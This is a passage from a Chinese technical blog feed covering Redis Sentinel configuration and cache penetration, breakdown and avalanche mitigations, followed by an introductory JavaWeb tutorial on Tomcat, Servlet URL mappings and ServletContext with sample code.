&lt;milliseconds&gt;</span></span><br><span class="line">sentinel failover-timeout mymaster 180000</span><br><span class="line"></span><br><span class="line"><span class="comment"># SCRIPTS EXECUTION</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置当某一事件发生时所需要执行的脚本，可以通过脚本来通知管理员，例如当系统运行不正常时发邮件通知 相关人员。</span></span><br><span class="line"><span class="comment">#对于脚本的运行结果有以下规则：</span></span><br><span class="line"><span class="comment">#若脚本执行后返回1，那么该脚本稍后将会被再次执行，重复次数目前默认为10</span></span><br><span class="line"><span class="comment">#若脚本执行后返回2，或者比2更高的一个返回值，脚本将不会重复执行。</span></span><br><span class="line"><span class="comment">#如果脚本在执行过程中由于收到系统中断信号被终止了，则同返回值为1时的行为相同。</span></span><br><span class="line"><span class="comment">#一个脚本的最大执行时间为60s，如果超过这个时间，脚本将会被一个SIGKILL信号终止，之后重新执行。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通知型脚本:当sentinel有任何警告级别的事件发生时（比如说redis实例的主观失效和客观失效等等）， 将会去调用这个脚本，这时这个脚本应该通过邮件，SMS等方式去通知系统管理员关于系统不正常运行的信 息。调用该脚本时，将传给脚本两个参数，一个是事件的类型，一个是事件的描述。如果sentinel.conf配 置文件中配置了这个脚本路径，那么必须保证这个脚本存在于这个路径，并且是可执行的，否则sentinel无 法正常启动成功。</span></span><br><span class="line"><span class="comment">#通知脚本</span></span><br><span class="line"><span class="comment"># shell编程</span></span><br><span class="line"><span class="comment"># sentinel notification-script &lt;master-name&gt; &lt;script-path&gt;</span></span><br><span class="line">sentinel notification-script mymaster /var/redis/notify.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端重新配置主节点参数脚本</span></span><br><span class="line"><span class="comment"># 当一个master由于failover而发生改变时，这个脚本将会被调用，通知相关的客户端关于master地址已 经发生改变的信息。</span></span><br><span class="line"><span class="comment"># 以下参数将会在调用脚本时传给脚本:</span></span><br><span class="line"><span class="comment"># &lt;master-name&gt; &lt;role&gt; &lt;state&gt; &lt;from-ip&gt; &lt;from-port&gt; &lt;to-ip&gt; &lt;to-port&gt;</span></span><br><span class="line"><span class="comment"># 目前&lt;state&gt;总是“failover”,</span></span><br><span class="line"><span class="comment"># &lt;role&gt;是“leader”或者“observer”中的一个</span></span><br><span class="line"><span class="comment"># 参数 from-ip, from-port, to-ip, to-port是用来和旧的master和新的master(即旧的slave)通 信的</span></span><br><span class="line"><span class="comment"># 这个脚本应该是通用的，能被多次调用，不是针对性的。</span></span><br><span class="line"><span class="comment"># sentinel client-reconfig-script &lt;master-name&gt; &lt;script-path&gt;</span></span><br><span class="line">sentinel client-reconfig-script mymaster /var/redis/reconfig.sh <span class="comment"># 一般都是由运维来配置！</span></span><br></pre></td></tr></table></figure>

<h1 id="十二、redis穿透和雪崩"><a href="#十二、redis穿透和雪崩" class="headerlink" title="十二、redis穿透和雪崩"></a>十二、redis穿透和雪崩</h1><p>在这里我们不会详细的区分析解决方案的底层！</p>
<p>Redis缓存的使用，极大的提升了应用程序的性能和效率，特别是数据查询方面。但同时，它也带来了一些问题。其中，最要害的问题，就是数据的一致性问题，从严格意义上讲，这个问题无解。如果对数据的一致性要求很高，那么就不能使用缓存。</p>
<p>另外的一些典型问题就是，缓存穿透、缓存雪崩和缓存击穿。目前，业界也都有比较流行的解决方案。</p>
<h2 id="1、缓存穿透（查不到）"><a href="#1、缓存穿透（查不到）" class="headerlink" title="1、缓存穿透（查不到）"></a>1、缓存穿透（查不到）</h2><blockquote>
<p>概念</p>
</blockquote>
<p>缓存穿透的概念很简单，用户想要查询一个数据，发现redis内存数据库没有，也就是缓存没有命中，于是向持久层数据库查询。发现也没有，于是本次查询失败。当用户很多的时候，缓存都没有命中（秒杀！），于是都去请求了持久层数据库。这会给持久层数据库造成很大的压力，这时候就相当于出现了缓存穿透。</p>
<blockquote>
<p>解决方案</p>
</blockquote>
<p><strong>1.布隆过滤器</strong></p>
<p>布隆过滤器是一种数据结构，对所有可能查询的参数以hash形式存储，在控制层先进行校验，不符合则丢弃，从而避免了对底层存储系统的查询压力；</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/c2dbc2632d43d48162bbc838fa569704--36d1--image-20240921190220109.png" alt="image-20240921190220109"></p>
<p><strong>2.缓存空对象</strong></p>
<p>当存储层不命中后，即使返回的空对象也将其缓存起来，同时会设置一个过期时间，之后再访问这个数据将会从缓存中获取，保护了后端数据源；</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/8033f6c667202d1b6b3e47451742523d--795d--image-20240921190233789.png" alt="image-20240921190233789"></p>
<p>但是这种方法会存在两个问题：</p>
<ol>
<li>如果空值能够被缓存起来，这就意味着缓存需要更多的空间存储更多的键，因为这当中可能会有很多的空值的键</li>
<li>即使对空值设置了过期时间，还是会存在缓存层和存储层的数据会有一段时间窗口的不一致，这对于需要保持一致性的业务会有影响</li>
</ol>
<h2 id="2、缓存击穿"><a href="#2、缓存击穿" class="headerlink" title="2、缓存击穿"></a>2、缓存击穿</h2><blockquote>
<p>概述（热点key过期）</p>
</blockquote>
<p>这里需要注意和缓存击穿的区别，缓存击穿，是指一个key非常热点，在不停的扛着大并发，大并发集中、对这一个点进行访问，当这个key在失效的瞬间，持续的大并发就穿破缓存，直接请求数据库，就像在一个屏障上凿开了一个洞。</p>
<p>当某个key在过期的瞬间，有大量的请求并发访问，这类数据一般是热点数据，由于缓存过期，会同时访问数据库来查询最新数据，并且回写缓存，会导使数据库瞬间压力过大</p>
<blockquote>
<p> 解决方案</p>
</blockquote>
<p><strong>1.设置热点数据永不过期</strong></p>
<p>从缓存层面来看，没有设置过期时间，所以不会出现热点 key 过期后产生的问题</p>
<p><strong>2.加互斥锁</strong></p>
<p>分布式锁：使用分布式锁，保证对于每个key同时只有一个线程去查询后端服务，其他线程没有获得分布式锁的权限，因此只需要等待即可。这种方式将高并发的压力转移到了分布式锁，因此对分布式锁的考验很大。</p>
<h2 id="3、缓存雪崩（缓存集中过期，宕机）"><a href="#3、缓存雪崩（缓存集中过期，宕机）" class="headerlink" title="3、缓存雪崩（缓存集中过期，宕机）"></a>3、缓存雪崩（缓存集中过期，宕机）</h2><blockquote>
<p>概念</p>
</blockquote>
<p>缓存雪崩，是指在某一个时间段，缓存集中过期失效。</p>
<p>产生雪崩的原因之一，比如在写本文的时候，马上就要到双十二零点，很快就会迎来一波抢购，这波商品时间比较集中的放入了缓存，假设缓存一个小时。那么到了凌晨一点钟的时候，这批商品的缓存就都过期了。而对这批商品的访问查询，都落到了数据库上，对于数据库而言，就会产生周期性的压力波峰。于是所有的请求都会达到存储层，存储层的调用量会暴增，造成存储层也会挂掉的情况。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/9396e3dceebaf224c16ab2e58f97730c--4b8c--image-20240921190254343.png" alt="image-20240921190254343"></p>
<p>其实集中过期，倒不是非常致命，比较致命的缓存雪崩，是缓存服务器某个节点宕机或断网。因为自然形成的缓存雪崩，一定是在某个时间段集中创建缓存，这个时候，数据库也是可以顶住压力的。无非就是对数据库产生周期性的压力而已。而缓存服务节点的宕机，对数据库服务器造成的压力是不可预知的，很有可能瞬间就把数据库压垮。</p>
<blockquote>
<p>解决方案</p>
</blockquote>
<p><strong>1.redis高可用</strong></p>
<p>这个思想的含义是，既然redis有可能挂掉，那我多增设几台redis，这样一台挂掉之后其他的还可以继续工作，其实就是搭建的集群。（异地多活！）</p>
<p><strong>2.限流降级</strong></p>
<p>这个解决方案的思想是，在缓存失效后，通过加锁或者队列来控制读数据库写缓存的线程数量。比如对某个key只允许一个线程查询数据和写缓存，其他线程等待。</p>
<p><strong>3.数据预热</strong></p>
<p>数据加热的含义就是在正式部署之前，我先把可能的数据先预先访问一遍，这样部分可能大量访问的数据就会加载到缓存中。在即将发生大并发访问前手动触发加载缓存不同的key，设置不同的过期时间，让缓存失效的时间点尽量均匀。</p>
]]></content>
  </entry>
  <entry>
    <title>Java-Web</title>
    <url>/2024/10/20/Java-Web/</url>
    <content><![CDATA[<p>Java系列之JavaWeb</p>
<span id="more"></span>

<h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><blockquote>
<p>web开发：</p>
</blockquote>
<ul>
<li><p>web，网页的意思  ， <a href="http://www.baidu.com/">www.baidu.com</a></p>
</li>
<li><p>静态web</p>
<ul>
<li>html，css</li>
<li>提供给所有人看的数据始终不会发生变化！</li>
</ul>
</li>
<li><p>动态web</p>
<ul>
<li>淘宝，几乎是所有的网站；</li>
<li>提供给所有人看的数据始终会发生变化，每个人在不同的时间，不同的地点看到的信息各不相同！</li>
<li>技术栈：Servlet&#x2F;JSP，ASP，PHP。</li>
</ul>
</li>
<li><p>在Java中，<strong>动态web资源开发的技术统称为JavaWeb</strong>。</p>
</li>
</ul>
<h3 id="2-web应用程序"><a href="#2-web应用程序" class="headerlink" title="2.web应用程序"></a>2.web应用程序</h3><blockquote>
<p>web应用程序：可以提供浏览器访问的程序。</p>
</blockquote>
<ul>
<li><p>a.html.b.html……多个web资源，这些web资源可以被外界访问，对外界提供服务。</p>
</li>
<li><p>我们能访问到的任何一个页面或者资源，都存在于这个世界的某一个角落的计算机上。</p>
</li>
<li><p>URL </p>
</li>
<li><p>这些统一的web资源会被放在同一个文件夹下，web应用程序–&gt;Tomcat：服务器。</p>
</li>
<li><p>一个web应用由多部分组成 （静态web，动态web）。</p>
<ul>
<li>html，css，js</li>
<li>jsp，servlet</li>
<li>Java程序</li>
<li>jar包</li>
<li>配置文件 （Properties）</li>
</ul>
</li>
<li><p>web应用程序编写完毕后，若想提供给外界访问：需要一个服务器来统一管理；</p>
</li>
</ul>
<h3 id="3-静态web"><a href="#3-静态web" class="headerlink" title="3.静态web"></a>3.静态web</h3><ul>
<li>*.htm, *.html，这些都是网页的后缀，如果服务器上一直存在这些东西，我们就可以直接进行读取。通络；</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/56c032f6d482f0b7a3b941486f65a997--c6b1--image-20241020155101909.png" alt="image-20241020155101909">静态web存在的缺点：</p>
<ul>
<li>Web页面无法动态更新，所有用户看到都是同一个页面；<ul>
<li>轮播图，点击特效：伪动态；</li>
<li>JavaScript [实际开发中，它用的最多]；</li>
<li>VBScript；</li>
</ul>
</li>
<li>它无法和数据库交互（数据无法持久化，用户无法交互）。</li>
</ul>
<h3 id="4-动态web"><a href="#4-动态web" class="headerlink" title="4.动态web"></a>4.动态web</h3><blockquote>
<p>页面会动态展示： “Web的页面展示的效果因人而异”；</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/807d51b5a32127d47907a9a33d7acb47--2e1b--image-20241020155149113.png" alt="image-20241020155149113"></p>
<p>当代项目基本上都是动态页面了，很少有纯静态的了。</p>
<p>缺点：</p>
<ul>
<li>加入服务器的动态web资源出现了错误，需要重新编写<strong>后台程序</strong>，重新发布；<ul>
<li>停机维护。</li>
</ul>
</li>
</ul>
<p>优点：</p>
<ul>
<li>Web页面可以动态更新，所有用户看到都不是同一个页面；</li>
<li>它可以与数据库交互 （数据持久化：注册，商品信息，用户信息……..）；</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/839e5d94ddf61fb98ac719e180a1df4b--0a5a--image-20241020155234661.png" alt="image-20241020155234661"></p>
<h2 id="二、web服务器"><a href="#二、web服务器" class="headerlink" title="二、web服务器"></a>二、web服务器</h2><h3 id="1-技术讲解"><a href="#1-技术讲解" class="headerlink" title="1.技术讲解"></a>1.技术讲解</h3><blockquote>
<p><strong>ASP:</strong></p>
</blockquote>
<ul>
<li><p>微软：国内最早流行的就是ASP；</p>
</li>
<li><p>在HTML中嵌入了VB的脚本，  ASP + COM；</p>
</li>
<li><p>在ASP开发中，基本一个页面都有几千行的业务代码，页面极其换乱，维护成本高！</p>
</li>
<li><p>C# </p>
</li>
<li><p>IIS</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            &lt;%</span><br><span class="line">            System.out.println(&quot;hello&quot;)</span><br><span class="line">            %&gt;</span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">       	<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>php：</strong></p>
</blockquote>
<ul>
<li>PHP开发速度很快，功能很强大，跨平台，代码很简单 （70% , WP）</li>
<li>无法承载大访问量的情况（局限性）</li>
</ul>
<blockquote>
<p>**JSP&#x2F;Servlet : ** </p>
</blockquote>
<p>JSP当下也基本上很少用到了，现时代主流的更多都是<strong>前后端分离</strong>！</p>
<p>B&#x2F;S：浏览和服务器</p>
<p>C&#x2F;S:  客户端和服务器</p>
<ul>
<li>sun公司主推的B&#x2F;S架构</li>
<li>基于Java语言的 (所有的大公司，或者一些开源的组件，都是用Java写的)</li>
<li>可以承载三高问题带来的影响；</li>
<li>语法像ASP ， ASP–&gt;JSP , 加强市场强度；</li>
</ul>
<p>…..</p>
<h3 id="2-web服务器"><a href="#2-web服务器" class="headerlink" title="2.web服务器"></a>2.web服务器</h3><ul>
<li><p>服务器是一种被动的操作，用来处理用户的一些请求和给用户一些响应信息；</p>
</li>
<li><p><strong>IIS</strong>（基本已经淘汰）</p>
<ul>
<li>微软的； ASP…,Windows中自带的</li>
<li>更多主要是在内网中可能会有稍微多点</li>
</ul>
</li>
<li><p>Tomcat</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/21fd1f5d7f17a0d70ace4add65570b9c--34f2--image-20241020155432949.png" alt="image-20241020155432949"></p>
</li>
<li><p>&#x3D;&#x3D;面向百度编程&#x3D;&#x3D;；</p>
</li>
<li><p>Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，因为Tomcat 技术先进.性能稳定，而且<strong>免费</strong>，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。</p>
</li>
<li><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a>，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个Java初学web的人来说，它是最佳的选择。</p>
</li>
<li><p>Tomcat 实际上运行JSP 页面和Servlet。Tomcat最新版本为<strong>9.0。</strong></p>
</li>
</ul>
<p>….</p>
<blockquote>
<p>有能力的时候可以尝试一下手写Tomcat服务器</p>
</blockquote>
<ul>
<li><p>下载tomcat：</p>
<ol>
<li><p>安装 or  解压；</p>
</li>
<li><p>了解配置文件及目录结构；</p>
</li>
<li><p>这个东西的作用。</p>
</li>
</ol>
</li>
</ul>
<h2 id="三、Tomcat"><a href="#三、Tomcat" class="headerlink" title="三、Tomcat"></a>三、Tomcat</h2><h3 id="1、Tomcat快速开始"><a href="#1、Tomcat快速开始" class="headerlink" title="1、Tomcat快速开始"></a>1、Tomcat快速开始</h3><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/2038d5afcb332887bf8d0c931e858d84--083d--image-20241020161607972.png" alt="image-20241020161607972"></p>
<ul>
<li><strong>启动。关闭Tomcat</strong></li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/6485889873973656ca74e813c31241e8--2943--image-20241020161631963.png" alt="image-20241020161631963"></p>
<h3 id="2、配置文件修改"><a href="#2、配置文件修改" class="headerlink" title="2、配置文件修改"></a>2、配置文件修改</h3><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/cf43a27a56d243669ba85e932373c951--36d6--image-20241020161652072.png" alt="image-20241020161652072"></p>
<p>还有就是一些其他的配置文件</p>
<p>比如tomcat-users是用来配置后台登录的</p>
<p>web.xml是用来配置一些比如首页是什么的</p>
<h3 id="3、发布一个Web网站"><a href="#3、发布一个Web网站" class="headerlink" title="3、发布一个Web网站"></a>3、发布一个Web网站</h3><ul>
<li><p>不会就先模仿：</p>
<ul>
<li>将自己写的网站，放到服务器(Tomcat)中指定的web应用的文件夹（webapps）下，就可以访问了。</li>
</ul>
</li>
<li><p>网站应该有的结构</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">--webapps ：Tomcat服务器的web目录</span><br><span class="line">	-ROOT</span><br><span class="line">	-books ：网站的目录名</span><br><span class="line">		- WEB-INF</span><br><span class="line">			-classes : java程序</span><br><span class="line">			-lib：web应用所依赖的jar包</span><br><span class="line">			-web.xml ：网站配置文件</span><br><span class="line">		- index.html 默认的首页</span><br><span class="line">		- <span class="keyword">static</span> </span><br><span class="line">            -css</span><br><span class="line">            	-style.css</span><br><span class="line">            -js</span><br><span class="line">            -img</span><br><span class="line">         -.....</span><br></pre></td></tr></table></figure>

<h2 id="四、Servlet"><a href="#四、Servlet" class="headerlink" title="四、Servlet"></a>四、Servlet</h2><h3 id="1-Servlet简介"><a href="#1-Servlet简介" class="headerlink" title="1.Servlet简介"></a>1.Servlet简介</h3><ul>
<li><p>Servlet就是sun公司开发动态web的一门技术。</p>
</li>
<li><p>Sun在这些API中提供一个接口叫做：Servlet，如果你想开发一个Servlet程序，只需要完成两个小步骤：</p>
<ul>
<li>编写一个类，实现Servlet接口。</li>
<li>把开发好的Java类部署到web服务器中。</li>
</ul>
</li>
<li><p><strong>把实现了Servlet接口的Java程序叫做，Servlet</strong>。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/613e74e1a2b25fb14171ed0cd6eb5c31--73b2--image-20241020165156954.png" alt="image-20241020165156954"></p>
<p>直接可以创建javaweb项目</p>
<h3 id="2、Serlvet原理"><a href="#2、Serlvet原理" class="headerlink" title="2、Serlvet原理"></a>2、Serlvet原理</h3><ul>
<li>Servlet是由Web服务器调用，web服务器在收到浏览器请求之后，会：</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/a930c7e6af9d9c0c572bb6bd34fae6aa--7f47--image-20241020165416033.png" alt="image-20241020165416033"></p>
<h3 id="3-Mapping问题"><a href="#3-Mapping问题" class="headerlink" title="3.Mapping问题"></a>3.Mapping问题</h3><ol>
<li><p>一个Servlet可以指定一个映射路径。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>一个Servlet可以指定多个映射路径。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello2<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello3<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello4<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello5<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>一个Servlet可以指定通用映射路径。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>默认请求路径。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--默认请求路径--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>指定一些后缀或者前缀等等….</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 可以自定义后缀实现请求映射</span></span><br><span class="line"><span class="comment">     注意点，*前面不能加项目映射的路径</span></span><br><span class="line"><span class="comment">     hello/subei.github</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.github<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>优先级问题。</p>
<ul>
<li>指定了固有的映射路径优先级最高，如果找不到就会走默认的处理请求；</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ErrorServelt</span> <span class="keyword">extends</span> <span class="title class_">HelloServlet</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        writer.println(<span class="string">&quot;&lt;h1&gt;404&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  404  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>error<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.ErrorServelt<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>error<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="4-ServletContext"><a href="#4-ServletContext" class="headerlink" title="4.ServletContext"></a>4.ServletContext</h3><ul>
<li>web容器在启动的时候，它会为每个web程序都创建一个对应的ServletContext对象，它代表了当前的web应用；</li>
</ul>
<h4 id="1-共享数据"><a href="#1-共享数据" class="headerlink" title="1.共享数据"></a>1.共享数据</h4><ul>
<li>在这个Servlet中保存的数据，可以在另外一个servlet中拿到；</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">//        this.getInitParameter(); 初始化参数</span></span><br><span class="line"><span class="comment">//        this.getServletConfig(); Servlet配置</span></span><br><span class="line"><span class="comment">//        this.getServletContext(); Servlet上下文</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;学习超好&quot;</span>;   <span 